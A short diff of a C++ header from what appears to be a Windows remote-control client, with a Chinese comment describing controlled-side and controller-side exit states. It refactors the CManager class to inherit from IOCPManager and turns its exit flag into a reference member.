@@ -9,10 +9,8 @@
 #pragma once
 #endif // _MSC_VER > 1000
 
-#include <windows.h>
 #include "..\common\commands.h"
-
-class IOCPClient;
+#include "IOCPClient.h"
 
 typedef IOCPClient CClientSocket;
 
@@ -23,10 +21,10 @@ HANDLE MyCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
 	DWORD dwCreationFlags,                    // creation option
 	LPDWORD lpThreadId, bool bInteractive = false);
 
-class CManager  
+class CManager : public IOCPManager 
 {
 public:
-	BOOL m_bIsDead; // 1-被控端退出 2-主控端退出
+	BOOL &g_bExit; // 1-被控端退出 2-主控端退出
 	CManager(IOCPClient* ClientObject);
 	virtual ~CManager();
 
